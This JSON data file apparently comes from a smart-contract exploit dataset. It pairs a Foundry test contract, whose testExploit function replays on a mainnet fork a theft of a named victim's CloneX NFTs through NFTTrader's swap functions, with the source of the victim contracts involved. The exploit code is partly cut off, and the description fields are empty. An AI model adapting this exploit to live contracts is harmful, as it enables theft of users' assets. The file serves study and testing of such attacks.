[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "onERC721Received",
    "original_code": "    function onERC721Received(\n        address operator,\n        address from,\n        uint256 tokenId,\n        bytes calldata data\n    ) external returns (bytes4) {\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 18_799_414);\n        vm.label(address(UniV3PosNFT), \"UniV3PosNFT\");\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(NFTTrader), \"NFTTrader\");\n        vm.label(address(CloneX), \"CloneX\");\n        vm.label(victim, \"Victim\");\n        vm.label(tradeSquad, \"tradeSquad\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        deal(address(this), 0.001 ether);\n\n        IUniV3PosNFT.MintParams memory params = IUniV3PosNFT.MintParams({\n            token0: address(USDC),\n            token1: address(WETH),\n            fee: 500,\n            tickLower: 0,\n            tickUpper: 100_000,\n            amount0Desired: 0,\n            amount1Desired: address(this).balance,\n            amount0Min: 0,\n            amount1Min: 0,\n            recipient: address(this),\n            deadline: block.timestamp\n        });\n\n        (uint256 positionId,,,) = UniV3PosNFT.mint{value: address(this).balance}(params);\n\n        vm.roll(18_799_435);\n        deal(address(this), 0.1 ether);\n        UniV3PosNFT.setApprovalForAll(address(CloneX), true);\n\n        vm.roll(18_799_487);\n        UniV3PosNFT.setApprovalForAll(address(NFTTrader), true);\n        require(CloneX.isApprovedForAll(victim, address(NFTTrader)));\n\n        emit log_named_uint(\"Victim CloneX balance before attack\", CloneX.balanceOf(victim));\n\n        emit log_named_uint(\"Exploiter CloneX balance before attack\", CloneX.balanceOf(address(this)));\n\n        uint256[] memory victimsCloneXTokenIds = new uint256[](CloneX.balanceOf(victim));\n        victimsCloneXTokenIds[0] = 6670;\n        victimsCloneXTokenIds[1] = 6650;\n        victimsCloneXTokenIds[2] = 4843;\n        victimsCloneXTokenIds[3] = 5432;\n        victimsCloneXTokenIds[4] = 9870;\n\n        for (uint8 i; i < victimsCloneXTokenIds.length; ++i) {\n            INFTTrader.swapIntent memory _swapIntent = INFTTrader.swapIntent({\n                id: 0,\n                addressOne: address(0),\n                valueOne: 0,\n                addressTwo: address(this),\n                valueTwo: 0,\n                swapStart: 0,\n                swapEnd: 0,\n                swapFee: 0,\n                status: 0\n            });\n\n            INFTTrader.swapStruct[] memory _nftsOne = new INFTTrader.swapStruct[](0);\n            INFTTrader.swapStruct[] memory _nftsTwo = new INFTTrader.swapStruct[](2);\n            uint256[] memory _tokenId1 = new uint256[](1);\n            _tokenId1[0] = positionId;\n            uint256[] memory _blc = new uint256[](0);\n            _nftsTwo[0] = INFTTrader.swapStruct({\n                dapp: address(UniV3PosNFT),\n                typeStd: tradeSquad,\n                tokenId: _tokenId1,\n                blc: _blc,\n                data: \"\"\n            });\n\n            uint256[] memory _tokenId2 = new uint256[](1);\n            _tokenId2[0] = victimsCloneXTokenIds[i];\n            _nftsTwo[1] = INFTTrader.swapStruct({\n                dapp: address(CloneX),\n                typeStd: tradeSquad,\n                tokenId: _tokenId2,\n                blc: _blc,\n                data: \"\"\n            });\n            vm.recordLogs();\n            NFTTrader.createSwapIntent{value: 0.005 ether}(_swapIntent, _nftsOne, _nftsTwo);\n            Vm.Log[] memory entries = vm.getRecordedLogs();\n            (swapId,) = abi.decode(entries[0].data, (uint256, address));\n            NFTTrader.closeSwapIntent{value: 0.005 ether}(address(this), swapId);\n",
    "description": ""
  },
  {
    "contract/interface": "IUniV3PosNFT",
    "source_type": "victim_contract",
    "function_name": "mint",
    "original_code": "    function mint(MintParams calldata params)\n        external\n        payable\n        override\n        checkDeadline(params.deadline)\n        returns (\n            uint256 tokenId,\n            uint128 liquidity,\n            uint256 amount0,\n            uint256 amount1\n        )\n    {\n        IUniswapV3Pool pool;\n        (liquidity, amount0, amount1, pool) = addLiquidity(\n            AddLiquidityParams({\n                token0: params.token0,\n                token1: params.token1,\n                fee: params.fee,\n                recipient: address(this),\n                tickLower: params.tickLower,\n                tickUpper: params.tickUpper,\n                amount0Desired: params.amount0Desired,\n                amount1Desired: params.amount1Desired,\n                amount0Min: params.amount0Min,\n                amount1Min: params.amount1Min\n            })\n        );\n\n        _mint(params.recipient, (tokenId = _nextId++));\n\n        bytes32 positionKey = PositionKey.compute(address(this), params.tickLower, params.tickUpper);\n        (, uint256 feeGrowthInside0LastX128, uint256 feeGrowthInside1LastX128, , ) = pool.positions(positionKey);\n\n        // idempotent set\n        uint80 poolId =\n            cachePoolKey(\n                address(pool),\n                PoolAddress.PoolKey({token0: params.token0, token1: params.token1, fee: params.fee})\n            );\n\n        _positions[tokenId] = Position({\n            nonce: 0,\n            operator: address(0),\n            poolId: poolId,\n            tickLower: params.tickLower,\n            tickUpper: params.tickUpper,\n            liquidity: liquidity,\n            feeGrowthInside0LastX128: feeGrowthInside0LastX128,\n            feeGrowthInside1LastX128: feeGrowthInside1LastX128,\n            tokensOwed0: 0,\n            tokensOwed1: 0\n        });\n\n        emit IncreaseLiquidity(tokenId, liquidity, amount0, amount1);\n    }\n\n    modifier isAuthorizedForToken(uint256 tokenId) {\n        require(_isApprovedOrOwner(msg.sender, tokenId), 'Not approved');\n        _;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IUniV3PosNFT",
    "source_type": "victim_contract",
    "function_name": "safeTransferFrom",
    "original_code": "    function safeTransferFrom(\n        address token,\n        address from,\n        address to,\n        uint256 value\n    ) internal {\n        (bool success, bytes memory data) =\n            token.call(abi.encodeWithSelector(IERC20.transferFrom.selector, from, to, value));\n        require(success && (data.length == 0 || abi.decode(data, (bool))), 'STF');\n    }\n\n    /// @notice Transfers tokens from msg.sender to a recipient\n    /// @dev Errors with ST if transfer fails\n    /// @param token The contract address of the token which will be transferred\n    /// @param to The recipient of the transfer\n    /// @param value The value of the transfer\n",
    "description": ""
  },
  {
    "contract/interface": "IUniV3PosNFT",
    "source_type": "victim_contract",
    "function_name": "setApprovalForAll",
    "original_code": "    function setApprovalForAll(address operator, bool approved) public virtual override {\n        require(operator != _msgSender(), \"ERC721: approve to caller\");\n\n        _operatorApprovals[_msgSender()][operator] = approved;\n        emit ApprovalForAll(_msgSender(), operator, approved);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "INFTTrader",
    "source_type": "victim_contract",
    "function_name": "closeSwapIntent",
    "original_code": "    function closeSwapIntent(address _swapCreator, uint256 _swapId) payable public whenNotPaused {\n        require(swapList[_swapCreator][swapMatch[_swapId]].status == swapStatus.Opened, \"Swap Status is not opened\");\n        require(swapList[_swapCreator][swapMatch[_swapId]].addressTwo == msg.sender, \"You're not the interested counterpart\");\n        if(payment.status) {\n            if(ERC721Interface(TRADESQUAD).balanceOf(msg.sender)==0) {\n                require(msg.value>=payment.value.add(swapList[_swapCreator][swapMatch[_swapId]].valueTwo), \"Not enought WEI for handle the transaction\");\n                // Move the fees to the vault\n                if(payment.value.add(swapList[_swapCreator][swapMatch[_swapId]].swapFee) > 0)\n                    VAULT.transfer(payment.value.add(swapList[_swapCreator][swapMatch[_swapId]].swapFee));\n            }\n            else {\n                require(msg.value>=swapList[_swapCreator][swapMatch[_swapId]].valueTwo, \"Not enought WEI for handle the transaction\");\n                if(swapList[_swapCreator][swapMatch[_swapId]].swapFee>0)\n                    VAULT.transfer(swapList[_swapCreator][swapMatch[_swapId]].swapFee);\n            }\n        }\n        else\n            require(msg.value>=swapList[_swapCreator][swapMatch[_swapId]].valueTwo, \"Not enought WEI for handle the transaction\");\n        \n        swapList[_swapCreator][swapMatch[_swapId]].addressTwo = msg.sender;\n        swapList[_swapCreator][swapMatch[_swapId]].swapEnd = block.timestamp;\n        swapList[_swapCreator][swapMatch[_swapId]].status = swapStatus.Closed;\n        \n        //From Owner 1 to Owner 2\n        uint256 i;\n        for(i=0; i<nftsOne[_swapId].length; i++) {\n            require(whiteList[nftsOne[_swapId][i].dapp], \"A DAPP is not handled by the system\");\n            if(nftsOne[_swapId][i].typeStd == ERC20) {\n                ERC20Interface(nftsOne[_swapId][i].dapp).transfer(swapList[_swapCreator][swapMatch[_swapId]].addressTwo, nftsOne[_swapId][i].blc[0]);\n            }\n            else if(nftsOne[_swapId][i].typeStd == ERC721) {\n                ERC721Interface(nftsOne[_swapId][i].dapp).safeTransferFrom(address(this), swapList[_swapCreator][swapMatch[_swapId]].addressTwo, nftsOne[_swapId][i].tokenId[0], nftsOne[_swapId][i].data);\n            }\n            else if(nftsOne[_swapId][i].typeStd == ERC1155) {\n                ERC1155Interface(nftsOne[_swapId][i].dapp).safeBatchTransferFrom(address(this), swapList[_swapCreator][swapMatch[_swapId]].addressTwo, nftsOne[_swapId][i].tokenId, nftsOne[_swapId][i].blc, nftsOne[_swapId][i].data);\n            }\n            else if(nftsOne[_swapId][i].typeStd == CRYPTOPUNK) { // Controllo che il CP sia su questo smart contract\n                require(CPInterface(CRYPTOPUNK).punkIndexToAddress(nftsOne[_swapId][i].tokenId[0]) == address(punkProxies[swapList[_swapCreator][swapMatch[_swapId]].addressOne]), \"CryptoPunk missing\");\n                punkProxies[swapList[_swapCreator][swapMatch[_swapId]].addressOne].proxyTransferPunk(CRYPTOPUNK, swapList[_swapCreator][swapMatch[_swapId]].addressTwo, nftsOne[_swapId][i].tokenId[0]);\n                punkInUse[nftsOne[_swapId][i].tokenId[0]] = false;\n            }\n            else {\n                customInterface(dappRelations[nftsOne[_swapId][i].dapp]).bridgeSafeTransferFrom(nftsOne[_swapId][i].dapp, dappRelations[nftsOne[_swapId][i].dapp], swapList[_swapCreator][swapMatch[_swapId]].addressTwo, nftsOne[_swapId][i].tokenId, nftsOne[_swapId][i].blc, nftsOne[_swapId][i].data);\n            }\n        }\n        if(swapList[_swapCreator][swapMatch[_swapId]].valueOne > 0)\n            swapList[_swapCreator][swapMatch[_swapId]].addressTwo.transfer(swapList[_swapCreator][swapMatch[_swapId]].valueOne);\n        \n        //From Owner 2 to Owner 1\n        for(i=0; i<nftsTwo[_swapId].length; i++) {\n            require(whiteList[nftsTwo[_swapId][i].dapp], \"A DAPP is not handled by the system\");\n            if(nftsTwo[_swapId][i].typeStd == ERC20) {\n                ERC20Interface(nftsTwo[_swapId][i].dapp).transferFrom(swapList[_swapCreator][swapMatch[_swapId]].addressTwo, swapList[_swapCreator][swapMatch[_swapId]].addressOne, nftsTwo[_swapId][i].blc[0]);\n            }\n            else if(nftsTwo[_swapId][i].typeStd == ERC721) {\n                ERC721Interface(nftsTwo[_swapId][i].dapp).safeTransferFrom(swapList[_swapCreator][swapMatch[_swapId]].addressTwo, swapList[_swapCreator][swapMatch[_swapId]].addressOne, nftsTwo[_swapId][i].tokenId[0], nftsTwo[_swapId][i].data);\n            }\n            else if(nftsTwo[_swapId][i].typeStd == ERC1155) {\n                ERC1155Interface(nftsTwo[_swapId][i].dapp).safeBatchTransferFrom(swapList[_swapCreator][swapMatch[_swapId]].addressTwo, swapList[_swapCreator][swapMatch[_swapId]].addressOne, nftsTwo[_swapId][i].tokenId, nftsTwo[_swapId][i].blc, nftsTwo[_swapId][i].data);\n            }\n            else if(nftsTwo[_swapId][i].typeStd == CRYPTOPUNK) {\n                require(CPInterface(CRYPTOPUNK).punkIndexToAddress(nftsTwo[_swapId][i].tokenId[0]) == address(punkProxies[swapList[_swapCreator][swapMatch[_swapId]].addressTwo]), \"CryptoPunk missing\");\n                punkProxies[swapList[_swapCreator][swapMatch[_swapId]].addressTwo].proxyTransferPunk(CRYPTOPUNK, swapList[_swapCreator][swapMatch[_swapId]].addressOne, nftsTwo[_swapId][i].tokenId[0]);\n                punkInUse[nftsTwo[_swapId][i].tokenId[0]] = false;\n            }\n            else {\n                customInterface(dappRelations[nftsTwo[_swapId][i].dapp]).bridgeSafeTransferFrom(nftsTwo[_swapId][i].dapp, swapList[_swapCreator][swapMatch[_swapId]].addressTwo, swapList[_swapCreator][swapMatch[_swapId]].addressOne, nftsTwo[_swapId][i].tokenId, nftsTwo[_swapId][i].blc, nftsTwo[_swapId][i].data);\n            }\n        }\n        if(swapList[_swapCreator][swapMatch[_swapId]].valueTwo>0)\n            swapList[_swapCreator][swapMatch[_swapId]].addressOne.transfer(swapList[_swapCreator][swapMatch[_swapId]].valueTwo);\n\n        emit swapEvent(msg.sender, (block.timestamp-(block.timestamp%secs)), swapStatus.Closed, _swapId, _swapCreator);\n    }\n\n    // Cancel Swap\n",
    "description": ""
  },
  {
    "contract/interface": "INFTTrader",
    "source_type": "victim_contract",
    "function_name": "createSwapIntent",
    "original_code": "    function createSwapIntent(swapIntent memory _swapIntent, swapStruct[] memory _nftsOne, swapStruct[] memory _nftsTwo) payable public whenNotPaused {\n        if(payment.status) {\n            if(ERC721Interface(TRADESQUAD).balanceOf(msg.sender)==0) {\n                require(msg.value>=payment.value.add(_swapIntent.valueOne), \"Not enought WEI for handle the transaction\");\n                _swapIntent.swapFee = getWeiPayValueAmount() ;\n            }\n            else {\n                require(msg.value>=_swapIntent.valueOne, \"Not enought WEI for handle the transaction\");\n                _swapIntent.swapFee = 0 ;\n            }\n        }\n        else\n            require(msg.value>=_swapIntent.valueOne, \"Not enought WEI for handle the transaction\");\n\n        _swapIntent.addressOne = msg.sender;\n        _swapIntent.id = _swapIds.current();\n        _swapIntent.swapStart = block.timestamp;\n        _swapIntent.swapEnd = 0;\n        _swapIntent.status = swapStatus.Opened ;\n\n        swapMatch[_swapIds.current()] = swapList[msg.sender].length;\n        swapList[msg.sender].push(_swapIntent);\n        \n        uint256 i;\n        for(i=0; i<_nftsOne.length; i++)\n            nftsOne[_swapIntent.id].push(_nftsOne[i]);\n            \n        for(i=0; i<_nftsTwo.length; i++)\n            nftsTwo[_swapIntent.id].push(_nftsTwo[i]);\n        \n        for(i=0; i<nftsOne[_swapIntent.id].length; i++) {\n            require(whiteList[nftsOne[_swapIntent.id][i].dapp], \"A DAPP is not handled by the system\");\n            if(nftsOne[_swapIntent.id][i].typeStd == ERC20) {\n                ERC20Interface(nftsOne[_swapIntent.id][i].dapp).transferFrom(_swapIntent.addressOne, address(this), nftsOne[_swapIntent.id][i].blc[0]);\n            }\n            else if(nftsOne[_swapIntent.id][i].typeStd == ERC721) {\n                ERC721Interface(nftsOne[_swapIntent.id][i].dapp).safeTransferFrom(_swapIntent.addressOne, address(this), nftsOne[_swapIntent.id][i].tokenId[0], nftsOne[_swapIntent.id][i].data);\n            }\n            else if(nftsOne[_swapIntent.id][i].typeStd == ERC1155) {\n                ERC1155Interface(nftsOne[_swapIntent.id][i].dapp).safeBatchTransferFrom(_swapIntent.addressOne, address(this), nftsOne[_swapIntent.id][i].tokenId, nftsOne[_swapIntent.id][i].blc, nftsOne[_swapIntent.id][i].data);\n            }\n            else if(nftsOne[_swapIntent.id][i].typeStd == CRYPTOPUNK) { // Controllo che il CP sia presente sul proxy e che non sia in uso in un altro trade\n                require(punkInUse[nftsOne[_swapIntent.id][i].tokenId[0]] == false, \"Punk in use on another trade\");\n                require(CPInterface(CRYPTOPUNK).punkIndexToAddress(nftsOne[_swapIntent.id][i].tokenId[0]) == address(punkProxies[msg.sender]), \"CryptoPunk missing\");\n                punkInUse[nftsOne[_swapIntent.id][i].tokenId[0]] = true;\n            }\n            else {\n                customInterface(dappRelations[nftsOne[_swapIntent.id][i].dapp]).bridgeSafeTransferFrom(nftsOne[_swapIntent.id][i].dapp, _swapIntent.addressOne, dappRelations[nftsOne[_swapIntent.id][i].dapp], nftsOne[_swapIntent.id][i].tokenId, nftsOne[_swapIntent.id][i].blc, nftsOne[_swapIntent.id][i].data);\n            }\n        }\n\n        emit swapEvent(msg.sender, (block.timestamp-(block.timestamp%secs)), _swapIntent.status, _swapIntent.id, _swapIntent.addressTwo);\n        _swapIds.increment();\n    }\n    \n    // Close the swap\n",
    "description": ""
  },
  {
    "contract/interface": "INFTTrader",
    "source_type": "victim_contract",
    "function_name": "editCounterPart",
    "original_code": "    function editCounterPart(uint256 _swapId, address payable _counterPart) public {\n        require(msg.sender == swapList[msg.sender][swapMatch[_swapId]].addressOne, \"Message sender must be the swap creator\");\n        swapList[msg.sender][swapMatch[_swapId]].addressTwo = _counterPart;\n    }\n\n    // Set the payment\n",
    "description": ""
  }
]